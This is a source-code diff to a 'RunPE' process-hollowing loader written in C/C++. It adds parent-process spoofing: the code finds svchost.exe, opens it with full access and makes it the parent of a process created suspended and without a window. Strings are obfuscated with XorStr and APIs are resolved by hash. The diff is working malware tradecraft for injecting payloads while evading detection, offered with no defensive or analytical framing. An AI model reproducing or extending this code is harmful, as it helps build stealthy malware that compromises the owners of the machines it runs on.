@@ -53,10 +53,7 @@ int	RunPE(void* lpFile, wchar_t* path, DWORD szFile, LPWSTR args)
 	*(DWORD_PTR*)&pVirtualAlloc = (DWORD_PTR)VirtualAlloc; //get_proc_address(hKernel32, 0x302ebe1c);
 	*(DWORD_PTR*)&pGetProcessId = get_proc_address(hKernel32, 0xba190f77);   
 
-	PROCESS_INFORMATION PI;
-	memset(&PI, 0, sizeof(PROCESS_INFORMATION));
-	STARTUPINFOW SI;
-	memset(&SI, 0, sizeof(STARTUPINFO));
+	
 
 	//https://stackoverflow.com/questions/46380166/getthreadcontext-returning-87 
 	CONTEXT CTX;
@@ -77,12 +74,60 @@ int	RunPE(void* lpFile, wchar_t* path, DWORD szFile, LPWSTR args)
 #endif
 	PIMAGE_SECTION_HEADER ISH = ((PIMAGE_SECTION_HEADER)((ULONG_PTR)(INH)+((LONG)(LONG_PTR) & (((IMAGE_NT_HEADERS*)0)->OptionalHeader)) + ((INH))->FileHeader.SizeOfOptionalHeader));
 
+	PROCESS_INFORMATION PI;
+	memset(&PI, 0, sizeof(PROCESS_INFORMATION));
 	
+#ifdef PPID 
+	STARTUPINFOEXW SI; 
+	memset(&SI, 0, sizeof(STARTUPINFOEXW));
+	
+	SIZE_T attributeSize;
+		 
+	InitializeProcThreadAttributeList(NULL, 1, 0, &attributeSize);
+	SI.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attributeSize);
+	InitializeProcThreadAttributeList(SI.lpAttributeList, 1, 0, &attributeSize);
+	
+	DWORD PID = FindProcByName((char*)XorStr("svchost.exe"));  
+	printfdbg("FindProcByName %d\n", PID); 
+	HANDLE parentProcessHandle = OpenProcess(
+		PROCESS_ALL_ACCESS, //MAXIMUM_ALLOWED
+		false,
+		PID);
+	 
+	 if (parentProcessHandle) {
+	printfdbg(XorStr("Open parent process OK: %d\n"), parentProcessHandle);
+
+	UpdateProcThreadAttribute(
+		SI.lpAttributeList,
+		0,
+		PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
+		&parentProcessHandle,
+		sizeof(HANDLE),
+		NULL,
+		NULL);
+		  
+	 } else
+	 printfdbg(XorStr("Open parent process error %s\n"), GetLastErrorAsText());
+	 
+	SI.StartupInfo.cb = sizeof(STARTUPINFOEXW);
+	 
+#ifndef DEBUG
+	if (pCreateProcessW(path, args, NULL, NULL, NULL,  
+	EXTENDED_STARTUPINFO_PRESENT | CREATE_SUSPENDED | CREATE_NO_WINDOW, NULL, NULL, &SI.StartupInfo, &PI))
+#else
+	if (pCreateProcessW(path, args, NULL, NULL, NULL,  
+	EXTENDED_STARTUPINFO_PRESENT | CREATE_SUSPENDED, NULL, NULL, &SI.StartupInfo, &PI))
+#endif
+
+#else //PPID 
+	STARTUPINFOW SI;  
+	memset(&SI, 0, sizeof(STARTUPINFOW));
 #ifndef DEBUG
 	if (pCreateProcessW(path, args, NULL, NULL, NULL, CREATE_SUSPENDED | CREATE_NO_WINDOW, NULL, NULL, &SI, &PI))
 #else
 	if (pCreateProcessW(path, args, NULL, NULL, NULL, CREATE_SUSPENDED, NULL, NULL, &SI, &PI))
 #endif
+#endif //PPID
 	{
 		//pid = pGetProcessId(PI.hProcess); 
 		printfdbg(XorStr("PID %x\n"),pGetProcessId(PI.hProcess));
@@ -142,6 +187,10 @@ int	RunPE(void* lpFile, wchar_t* path, DWORD szFile, LPWSTR args)
 
 	} else printfdbg(XorStr("Error creating process %s\r\n"),GetLastErrorAsText());
 
+	#ifdef PPID
+	CloseHandle(parentProcessHandle);
+	#endif
+	
 	if (PI.hProcess)
 	{
 		//	cout << "PI.hProcess)" << endl;
